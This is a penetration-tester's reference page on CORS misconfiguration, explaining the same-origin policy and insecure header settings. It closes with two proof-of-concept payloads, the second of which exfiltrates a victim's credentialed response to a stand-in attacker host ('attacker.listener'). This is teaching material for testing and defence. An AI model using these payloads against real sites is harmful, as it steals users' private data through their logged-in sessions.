<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# Cross-origin resource sharing (CORS) misconfiguration


## Key Takeaway

>>>
Always check for CORS headers on pages with sensitive data or that perform sensitive actions. If these headers are set insecurely, they can enable CSRF or access to sensitive data. 
>>>

## Summary

The same-origin policy (SOP) is a foundational concept when it comes to securing web applications. It serves to limit the amount of data that is shared between websites having a different *origin*. An origin can be defined as a unique combination of **URI scheme** (http://, https://) **hostname** and **port number**. A resource which differs in one or more of these areas is considered a different **origin**. 

This concept is critical in preventing scripts running on one site - say a malicious site a user was phished into visiting - from having access to the document object model (DOM), cookies, local  storage, etc on another site, say their bank. If this policy was not in place, it would be trivial for a malicious site to simply call on the browser to make an AJAX call to your bank and perform an action using the current session cookies (this is cross-site request forgery) or to access a page with sentisive info and exfiltrate the contents. 

The complexity of modern web applications often requires that sites call on a user's browser to post data to, or access data from site with a different origin. Sometimes this is another subdomain on the same domain and sometimes this might be an entirely different third-party partner domain. In order to selectively bypass the same-origin policy, Cross-origin resource sharing (CORS) was created.

In effect, CORS is a highly granular exception to the default same-origin policy. Response headers for a particular site can inform the browser which domains are allowed to communicate with. The user's browsers will dutifully obey these instructions and block any other site within user's browser that tries to make requests to it.

Unfortunately, these headers are often misconfigured. 


The **Access-Control-Allow-Origin** header can be set to a wildcard which means requests originating from any other site are permitted to communicate with it. The browser will stand-down in it's normal behavior or blocking these sort of requests, effectively giving the authors of the malicious page access to the victim domain via instructions set forth in its Javascript.

Even if this header is carelessly set to a wildcard when it shouldn't be (there are certainly legitimate cases for  it), the browser will still protect the site from requests that require the victim to send credentials, such as a session cookie. But this too can be allowed with the inclusion of another header: **Access-Control-Allow-Credentials: true**. If these two headers are set incorrectly on a page housing sensitive data, it is trivial for an attacker to build a malicious page that will instruct the victims browser to access the page and exfiltrate the contents. 

Often, the Access-Control-Allow-Credentials header will be set dynamically based on the user's **Origin** request header. If there is no domain whitelisting taking place, this is functionally equivilent to a wildcard since the user's browser will automatically send an Origin header populated with the current domain.


## Resources

* Mozilla Developer Overview of CORS [https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
* PortSwigger Academy (CORS) [https://portswigger.net/web-security/cors](https://portswigger.net/web-security/cors)
* PentesterLab.com Cross-Origin Resource Sharing Exercise (requires PRO account)[https://pentesterlab.com/exercises/cors/course](https://pentesterlab.com/exercises/cors/course)
* PortSwigger Academy (CORS II) (Requires PRO account)[https://portswigger.net/web-security/cors](https://portswigger.net/web-security/cors)
* PentesterLab.com Cross-Origin Resource Sharing Exercise [https://pentesterlab.com/exercises/cors/course](https://pentesterlab.com/exercises/cors/course)

## Tools

Burpsuite will automatically identify and report CORS issues with both its active and passive scanners. 

## Payloads

When attempting to exploit a CORS issue, it is usually required to create and host a malicious page which the victim would then be directed to - perhaps via a phishing email.

The following is a generic example of a page suitible for testing and documenting a CORS vulnerability, which will request a particular page and log the result to the console. For use against an actual victim, it could be modified to exfiltrate the data instead of just logging it.

```
<html>
<head>
<script>
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        console.log(xhr.responseText);
    }
}
xhr.open("POST", 'https://example.com/url/?query=value', true);
xhr.withCredentials = true;
xhr.setRequestHeader('ArbitraryHeader', "IfYouNeedIt");
xhr.send(null);
</script>
</head>
<body>
<p>CORS PoC</p>
</body>
</html>
```

Sometimes, a server will respond with **Access-Control-Allow-Origin: null** if the requesting user sends the request header **Origin: null**. The following payload can be used to manipulate the victim browser into sending this header allowing for exploitation:

```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://target.victim/sensitiveData',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://attacker.listener/log?key='+this.responseText;
};
</script>"></iframe>
```


